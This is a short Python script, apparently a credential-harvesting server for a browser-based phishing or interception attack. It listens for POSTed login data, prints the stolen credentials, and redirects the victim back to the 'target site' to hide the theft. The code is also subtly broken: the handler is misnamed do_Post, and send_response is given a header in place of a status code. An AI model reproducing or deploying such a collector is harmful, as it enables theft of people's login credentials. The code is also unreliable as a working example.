from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import  unquote

class CredRequestHandler( SimpleHTTPRequestHandler ) :          #responsible for handling the HTTP POS requests
    def do_Post(self):
        content_length = int(self.headers['content-Length'])    #when request is recieved ,read the content-Length header to determine size of request
        print(content_length)
        creds          = self.rfile.read(content_length).decode('utf-8')    #read coontent of request
        print(creds)    #print the content of request
        site = self.path[1:]    #parsing out the originating site
        self.send_response('Location' ,unquote(site))   #force browser to redirect back to the main page of tagret site
        self.end_headers()

#initialize the base TCPserver class with the IP,Port and CredRequesthandler class
server = TCPServer(('127.0.0.1' ,8080) ,CredRequestHandler)
server.serve_forever()